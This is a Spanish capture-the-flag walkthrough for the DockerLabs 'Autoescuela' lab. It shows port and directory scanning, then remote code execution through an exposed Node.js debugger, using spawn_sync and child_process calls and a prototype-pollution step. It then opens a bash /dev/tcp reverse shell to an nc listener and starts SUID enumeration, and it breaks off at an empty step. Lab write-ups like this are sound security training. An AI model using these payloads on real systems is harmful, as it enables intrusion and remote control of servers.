
### Autoescuela-DockerLabs🇪🇸

#### 1. Primero debemos de descomprimir el archivo y lo moveremos a nuestra zona de trabajo.
```bash
unzip autoescuela.zip 
```

<img width="923" height="201" alt="image" src="https://github.com/user-attachments/assets/6e16dbc4-2ae3-4b4e-b81f-8121191f97cc" />


#### 1.2 Ahora procedemos a encender el laboratorio.
```bash
sudo bash ./auto_deploy.sh autoescuela.tar 
```

<img width="925" height="389" alt="image" src="https://github.com/user-attachments/assets/66bc2314-6095-47d8-863e-83d5cce5d412" />


#### 1.3 Vamos a realizar un ping para comprobar la conexión.
```bash
 ping -c3 172.17.0.2
```

<img width="694" height="162" alt="image" src="https://github.com/user-attachments/assets/11ff8ff2-b183-4bcb-8b34-92e55d613c81" />


#### 2. Ahora rastrearemos los puertos que están abiertos.
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

<img width="914" height="442" alt="image" src="https://github.com/user-attachments/assets/c00289d2-03e3-4ebb-bb16-a49634eeef00" />

*Veremos que en el puerto 8080 no hay nada interesante para ejecutar y pasaremos al otro*


#### 3. Ahora realizaremos un escaneo de direcotrios abiertos mediante gobuter.
```bash
 gobuster dir -u http://172.17.0.2:9229/ \
                                 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
                                 -x env,php,bak,old,zip,txt \
                                 -b 400,403,404 \
                                 --exclude-length 33
```

<img width="919" height="484" alt="image" src="https://github.com/user-attachments/assets/f4353e62-92b2-4da8-862d-534e1674441c" />


#### 4. Entraremos en la web y veremos un archivo node sabiendo que hay  presencia activa del servicio de depuración de Node.js y que podemos comprometerlo.

<img width="994" height="400" alt="image" src="https://github.com/user-attachments/assets/6ca07022-d911-447c-9b3b-e400854eaad1" />

#### 4.2 Ahora procederemos a entrar en la consola de node.
```bash
 node inspect 172.17.0.2:9229 
```

<img width="609" height="45" alt="image" src="https://github.com/user-attachments/assets/2c722ca6-4aef-4d54-b2a8-11a34a8c89d4" />


#### 4.3 Ahora veremos las versiones que están presentes.
```bash
exec('process.versions')
```

#### 4.4 Haremos una ejecución nativa.
```bash
exec('const spawn = process.binding("spawn_sync"); const result = spawn.spawn({file:"/bin/sh",args:["/bin/sh","-c","id"],stdio:[{type:"pipe",readable:true,writable:false},{type:"pipe",readable:false,writable:true},{type:"pipe",readable:false,writable:true}],envPairs:[]}); result.output[1]')
```

<img width="920" height="100" alt="image" src="https://github.com/user-attachments/assets/a84f3699-0aba-4f10-8a83-4b084ea0e3f3" />


#### 4.5 Procedemos a realizar una inyección en el prototipo global.
```bash
exec('Object.prototype.require = function(m) { return process.mainModule.require(m) }')
```

<img width="917" height="42" alt="image" src="https://github.com/user-attachments/assets/35160012-d5ee-4657-889f-a70afd1ab18c" />


#### 4.6 Ahora iniciaremos una verificación para ver si existe la persistencia de la contaminación.
```bash
exec('Object.prototype.polluted = "yes"; polluted')
```

<img width="781" height="43" alt="image" src="https://github.com/user-attachments/assets/f679533f-cbcc-4f83-b5cc-dd405a2921c3" />


#### 4.7 Ejecutaremos los comandos mediante bypass.
```bash
exec('({}).require("child_process").execSync("id").toString()')
```

<img width="783" height="61" alt="image" src="https://github.com/user-attachments/assets/3f79e1e3-639a-4edb-ae4b-bcbdad456d48" />


#### 4.8 Empezaremos a escuchar mediante otra terminal
```bash
sudo nc -lvnp 4445
```

<img width="924" height="121" alt="image" src="https://github.com/user-attachments/assets/2ee2a84e-cc00-4422-894a-c73d7196752f" />


#### 4.9 Ahora trasmitimos el payload para que se escuche desde el netcast.
```bash
exec('({}).require("child_process").execSync("bash -c \'bash -i >& /dev/tcp/172.17.0.1/4445 0>&1\'")')```
```

<img width="921" height="180" alt="image" src="https://github.com/user-attachments/assets/bed2dc46-296f-459e-90b5-033032547d0f" />


#### 5. Ahora que ha funcionado la reverse shell debemos de escalar privilegios. 

### User Flag

<img width="700" height="347" alt="image" src="https://github.com/user-attachments/assets/a40833ce-6e73-4203-9660-ad25b4129ac9" />


#### 6. Veremos ahora con `find / -perm -4000 -type f 2>/dev/null` que binarios podemos moificar


<img width="771" height="222" alt="image" src="https://github.com/user-attachments/assets/9e361e22-c06c-48e2-b8dd-b6557e374efd" />


#### 7. 







